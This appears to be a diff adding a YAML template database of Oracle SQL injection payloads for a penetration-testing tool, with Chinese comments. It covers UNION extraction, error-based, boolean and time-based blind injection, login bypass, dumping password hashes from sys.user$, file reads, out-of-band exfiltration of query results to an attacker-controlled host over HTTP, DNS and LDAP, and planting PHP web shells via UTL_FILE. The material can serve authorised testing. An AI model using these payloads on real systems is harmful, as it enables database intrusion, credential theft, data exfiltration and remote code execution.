@@ -1,0 +1,460 @@
+ruleDB: v0.1.0
+# Oracle 注入模板。
+#
+# 方言特点，都是数据层面的差异，不影响结构：
+#   - SELECT 不带表名必须写 FROM dual（这是 Oracle 独有的一条）
+#   - 版本号在 v$version 视图的 banner 列，标识符里带 $
+#   - 字符串拼接用 ||
+
+templates:
+  - id: sqli.oracle.detect.version
+    name: Oracle 版本回显
+    desc: 标识符 v$version 里带 $，shell 单引号包裹时是字面量，不会被展开
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,banner)>> FROM v$version <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.oracle.union.basic
+    name: Oracle UNION 联合查询
+    desc: Oracle 的 SELECT 必须带 FROM，没有表就写 dual
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos)>> FROM dual <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.oracle.union.marker
+    name: Oracle UNION 回显位标记
+    desc: 还不知道哪一列会回显时先用它，标记出现在页面上，那一列就是回显位。默认标记用 CHR(65) 而不是字符串字面量，少一层引号转义的麻烦
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+      marker:  {options: ["'ab'", "'a b'", "CHR(65)"], default: "CHR(65)"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,marker)>> FROM dual <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.union.tables
+    name: Oracle UNION 读表名
+    desc: 已经确认有回显位、要列表名时用。user_tables 只有当前用户自己的表，要别的 schema 得换 all_tables；Oracle 的表名默认大写，按小写比对不上
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,table_name)>> FROM user_tables <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.union.current
+    name: Oracle 当前用户
+    desc: dual 里取当前用户名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,user)>> FROM dual <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 报错注入 ----
+
+  - id: sqli.oracle.error.utl_inaddr
+    name: Oracle utl_inaddr 报错注入
+    desc: 经典路径，把表达式当主机名去解析，报错信息里带出值
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=utl_inaddr.get_host_address((<<expr>>)) <<comment>>"
+    vars: [expr]
+    requires: [error, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.oracle.error.ctxsys
+    name: Oracle CTXSYS 报错注入
+    desc: utl_inaddr 被回收后的替代路径
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=CTXSYS.DRITHSX.SN(1,(<<expr>>)) <<comment>>"
+    vars: [expr]
+    requires: [error, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 盲注 ----
+
+  - id: sqli.oracle.bool.blind
+    name: Oracle 布尔盲注
+    desc: 页面在条件为真/假时返回的内容不同时用。Oracle 没有 sleep，真要时间盲注只能靠 dbms_pipe 那条的等待超时，比别的方言难标定
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND (<<cond>>) <<comment>>"
+    vars: [cond]
+    requires: [boolean]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.time.dbms_pipe
+    name: Oracle 时间盲注 dbms_pipe
+    desc: Oracle 没有 sleep，用 dbms_pipe.receive_message 的等待超时
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      secs:    {options: ["3", "5", "10"], default: "5"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=(CASE WHEN (<<cond>>) THEN dbms_pipe.receive_message(('a'),<<secs>>) ELSE 1 END) <<comment>>"
+    vars: [cond]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.oracle.time.dbms_lock
+    name: Oracle 时间盲注 DBMS_LOCK（PL/SQL 块）
+    desc: 网上流传的 `AND 1=dbms_lock.sleep(5)` 写法**是错的**——DBMS_LOCK.SLEEP 是带 OUT 语义的**过程**不是函数，放进 SQL 表达式报 PLS-00221/ORA-06550，只有 PL/SQL 块里能调。所以这条要堆叠，而且 DBMS_LOCK 的 EXECUTE **不是默认给 PUBLIC 的**，得 SYS 直接授权（走角色授权在 PL/SQL 里无效）。不支持堆叠就别用这条，改走 dbms_pipe 那条。SLEEP 没有 3600 秒上限，18c 起本包被标记废弃
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      secs:  {options: ["3", "5", "10"], default: "5"}
+    # 条件判断放在 IF 里，真假两条路一条睡一条不睡——快慢差异就是判据
+    body: "<<close>>; BEGIN IF (<<cond>>) THEN dbms_lock.sleep(<<secs>>); END IF; END;--"
+    vars: [cond]
+    requires: [stacked]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 带外 ----
+
+  - id: sqli.oracle.oob.utl_http
+    name: Oracle UTL_HTTP 带外
+    desc: 把表达式结果拼进 URL 发出去
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=utl_http.request('http://<<lhost>>/'||(<<expr>>)) <<comment>>"
+    vars: [lhost, expr]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.oracle.auth.bypass
+    name: Oracle 登录绕过
+    desc: 闭合符按注入点上下文选
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> OR 1=1<<comment>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.auth.bypass.admin
+    name: Oracle 指定用户登录绕过
+    desc: 已知用户名时的绕过。用户名默认 admin，按目标实际账号改
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      username: {options: ["admin", "administrator", "root", "sa", "test", "guest"],
+                 default: "admin"}
+      close:    {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment:  {options: ["--", "/**/"], default: "--"}
+    body: "<<username>><<close>> <<comment>>"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 信息收集 ----
+
+  - id: sqli.oracle.union.columns
+    name: Oracle 读列名
+    desc: 已知表名后读它的列名。Oracle 的标识符默认大写，表名不对就加 upper()
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["column_name", "wm_concat(column_name)"], default: "column_name"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM user_tab_columns WHERE table_name='<<table>>' <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.union.hash
+    name: Oracle 读账号密码哈希
+    desc: 需要 DBA 权限。11g 起密码在 spare4 列（SPARE4），更早的版本在 password 列
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      hashcol: {options: ["spare4", "password"], default: "spare4"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,(select username||':'||<<hashcol>> from sys.user$ where rownum=1))>> FROM dual <<comment>>"
+    requires: [echo, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入 ----
+
+  - id: sqli.oracle.error.xmltype
+    name: Oracle XMLType 报错注入
+    desc: utl_inaddr 被回收、CTXSYS 也没了之后的路径。把值拼进 XML 标签名，解析失败时把标签名原样报出来
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    # chr(60) 是 <，chr(58) 是 :，chr(62) 是 > —— 拼成 <:值> 当标签名，
+    # 值是非法标识符时 ORA-31011 会把整段带出来
+    body: "<<close>> AND 1=(SELECT upper(XMLType(chr(60)||chr(58)||(<<expr>>)||chr(62))) FROM dual) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 带外 ----
+
+  - id: sqli.oracle.oob.dns
+    name: Oracle DNS 带外
+    desc: 把值当成主机名的一部分去解析，解析请求本身就是数据。收到 DNS 日志即可，不需要目标能回连你的端口
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=utl_inaddr.get_host_address((<<expr>>)||'.<<domain>>') <<comment>>"
+    vars: [expr, domain]
+    requires: [outbound, weak-hardening, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.oob.dns.ldap
+    name: Oracle DNS 带外（DBMS_LDAP）
+    desc: utl_inaddr 在 11g 起被网络 ACL 挡住（ORA-24247）之后的替代。DBMS_LDAP.INIT 会去解析主机名，解析请求落到你的 DNS 日志里就说明通了。EXECUTE ON DBMS_LDAP **默认给 PUBLIC**（回收它是 CIS 的加固项），被回收了就换别的路。它返回的是包内定义的 SESSION 句柄类型，个别版本上放进 SQL 表达式会报类型错——那时改用 PL/SQL 块
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=DBMS_LDAP.INIT((<<expr>>)||'.<<domain>>',80) <<comment>>"
+    vars: [expr, domain]
+    requires: [outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 文件 ----
+
+  - id: sqli.oracle.file.read
+    name: Oracle 读文件
+    desc: 走 DBMS_XSLPROCESSOR 的 READ2CLOB，**不需要先建目录对象**——这正是它比 UTL_FILE 好用的地方。需要 DBA
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,DBMS_XSLPROCESSOR.READ2CLOB('<<filepath>>'))>> FROM dual <<comment>>"
+    vars: [filepath]
+    requires: [echo, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.oracle.union.xmlgen
+    name: Oracle DBMS_XMLGEN 整查询回显
+    desc: 把**一整条查询**包成 XML 回显，一次能带出多行多列（ROWSET/ROW 结构）。注意它是**回显**手段，不是报错手段——ORA-19202 带出来的是内层 SQL 的报错，不是数据；想要报错带数据用 XMLType 那条。外面那层 dbms_lob.substr 不能省——getxml 返回 CLOB，直接放进 UNION 会和数字列撞类型（ORA-00932）；要 XMLType 形态就把 getxml 换成 getxmltype 再 .getstringval()。DBMS_XMLGEN 的 EXECUTE 默认给 PUBLIC，不需要 DBA
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    # 4000 是 SQL 层 VARCHAR2 的上限：dbms_lob.substr 把 CLOB 截成 VARCHAR2，
+    # 超长的结果要分页取
+    body: "<<close>> UNION SELECT <<select(cols,pos,dbms_lob.substr(dbms_xmlgen.getxml('<<stmt>>'),4000,1))>> FROM dual <<comment>>"
+    vars: [stmt]
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # 读文件的 UTL_FILE 版本故意不提供：UTL_FILE.GET_LINE 是带 OUT 参数的**过程**，
+  # 不是函数，放进 SELECT 列表直接报错——能嵌在 SQL 表达式里的是
+  # DBMS_XSLPROCESSOR.READ2CLOB（见上面的 sqli.oracle.file.read）和 DBMS_LOB。
+  # 目录对象那套前提只对 PL/SQL 块里的 UTL_FILE 有意义。
+
+  - id: sqli.oracle.file.write.utl_file
+    name: Oracle UTL_FILE 写文件
+    desc: 往目录对象指向的路径写文件，前提是**先有目录对象**（CREATE DIRECTORY 指向真实路径，建它要 DBA）且对该目录有 WRITE 权限。UTL_FILE 的 PUT_LINE / FOPEN / FCLOSE_ALL 全是**过程**，放进 SELECT 列表会直接报错，所以这条只能是 PL/SQL 块——而 Oracle 的 JDBC/OCI 驱动基本不支持多语句，实际只有 sqlplus、部分批量接口走得通。fopen 的 'W' 会截断已有文件，不想覆盖就换成 'A'
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      code:
+        options: ["<?php @eval($_POST[1]);?>", "<?php system($_GET[c]);?>"]
+        default: "<?php @eval($_POST[1]);?>"
+    body: "<<close>>; BEGIN utl_file.put_line(utl_file.fopen('<<dir>>','<<file>>','W'),'<<code>>'); utl_file.fclose_all; END;--"
+    vars: [dir, file]
+    requires: [stacked, writable, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 没有聚合函数时怎么逐行搬 ----
+
+  - id: sqli.oracle.union.rownum
+    name: Oracle rownum 逐行取数
+    desc: Oracle 既没有 LIMIT 也没有能用的 group_concat（11g 的 wm_concat 到 12c 被移除），已知列名但要一行行搬数据时用它。rownum 只能跟 < / <= 比较，所以「第 N 行」得先在内层排序、外层再卡 rownum；列名还没拿到就先用 union.columns 读 user_tab_columns
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [oracle]
+    version: ">=9i"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      n:      {options: ["1", "2", "3", "5", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    # ORDER BY 必须在**内层**：外层再排序的话 rownum 已经先分配完了，
+    # 卡出来的就不是「排序后的前 N 行」——这是 Oracle 上一个经典的写错点
+    body: "<<close>> UNION SELECT <<select(cols,pos,<<col>>)>> FROM (SELECT <<col>> FROM <<table>> ORDER BY <<col>>) WHERE rownum<=<<n>> <<comment>>"
+    vars: [col, table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
